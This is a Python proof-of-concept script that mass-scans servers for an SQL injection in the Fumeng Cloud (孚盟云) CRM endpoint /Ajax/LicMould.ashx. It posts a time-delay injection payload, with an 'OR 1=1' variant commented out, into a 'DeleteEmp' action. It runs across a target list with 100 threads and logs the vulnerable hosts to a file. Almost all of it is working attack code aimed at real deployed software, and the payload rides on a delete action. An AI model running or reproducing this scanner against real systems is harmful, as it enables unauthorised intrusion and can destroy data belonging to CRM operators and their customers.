import argparse,re,requests,sys
from multiprocessing.dummy import Pool


def banner():
    test = """ """
    print(test)

def poc(target):
    # payload = {"action":"DeleteEmp", "key":"1 OR 1=1", "fuids":"abc,def"}
    payload = {"action":"DeleteEmp","key":"1 WAITFOR DELAY '0:0:4'","fuids":"abc,def,"}
    url1 = "/Ajax/LicMould.ashx"
    try:
        res1 = requests.get(url=target,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+url1,data=payload,timeout=5)
            if re.search(r"ok", res2.text):
                print(f"[+]{target}存在sql注入漏洞")
                with open('result4.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        pass

def main():
    banner()
    # 第一个处理用户输入的参数
    parse = argparse.ArgumentParser(description="孚盟云CRM /LicMould.ashx SQL注入漏洞")

    # 添加命令行的参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    # 实例化
    args = parse.parse_args()

    # 判断用户输入
    if args.url and not args.file:
        # 开始测试
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usage: Python {sys.argv[0]} -h")

# 程序的入口
if __name__ == "__main__":
    main()
